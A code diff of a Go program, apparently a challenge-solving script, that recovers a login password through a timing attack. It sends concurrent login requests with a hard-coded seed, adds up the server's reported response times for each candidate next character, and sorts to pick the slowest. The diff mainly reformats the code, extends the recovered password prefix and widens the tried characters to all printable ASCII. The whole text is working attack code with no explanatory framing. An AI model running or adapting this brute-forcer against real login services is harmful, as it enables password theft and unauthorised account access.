@@ -11,14 +11,14 @@ import (
 )
 
 type LoginData struct {
-	Seed string
+	Seed     string
 	Password string
 }
 
 type Response struct {
 	IsValid bool
 	LockURL string
-	Time int32
+	Time    int32
 }
 
 type Result struct {
@@ -28,11 +28,11 @@ type Result struct {
 
 type Calculation struct {
 	Password string
-	Time int64
+	Time     int64
 }
 
 func sendRequest(password string, r chan Result) {
-	j, err := json.Marshal(LoginData{ Seed: "6e729d17d1e94b4089cafc7bf086a4c1", Password: password})
+	j, err := json.Marshal(LoginData{Seed: "6e729d17d1e94b4089cafc7bf086a4c1", Password: password})
 
 	if err != nil {
 		panic(err)
@@ -78,31 +78,19 @@ func sendRequest(password string, r chan Result) {
 func main() {
 	c := make(chan Result)
 	m := sync.Map{}
-	curr := "4b28"
+	curr := "4b28830d68ec4cf1b"
 
-	for i := 'a'; i <= 'z'; i++ {
-		for j := 0;j<5;j++ {
-			go sendRequest(curr + string(i)+"a", c)
+	for i := ' '; i <= '~'; i++ {
+		for j := 0; j < 5; j++ {
+			go sendRequest(curr+string(i)+"a", c)
 		}
 	}
 
-	for i := 'A'; i <= 'Z'; i++ {
-		for j := 0;j<5;j++ {
-			go sendRequest(curr + string(i)+"a", c)
-		}
-	}
-
-	for i := '0'; i <= '9'; i++ {
-		for j := 0;j<5;j++ {
-			go sendRequest(curr + string(i)+"a", c)
-		}
-	}
-
-	for i := 0; i < ('z' - 'a' + 'Z' - 'A' + '9' - '0') * 5; i++ {
-		resp := <- c
+	for i := 0; i < ('~'-' ')*5; i++ {
+		resp := <-c
 		act, loaded := m.LoadOrStore(resp.Password, int64(resp.Response.Time))
 		if loaded {
-			m.Store(resp.Password, act.(int64) + int64(resp.Response.Time))
+			m.Store(resp.Password, act.(int64)+int64(resp.Response.Time))
 		}
 	}
 
@@ -112,7 +100,6 @@ func main() {
 		s = append(s, Calculation{key.(string), value.(int64)})
 		return true
 	})
-
 
 	sort.Slice(s, func(i, j int) bool {
 		return s[i].Time > s[j].Time
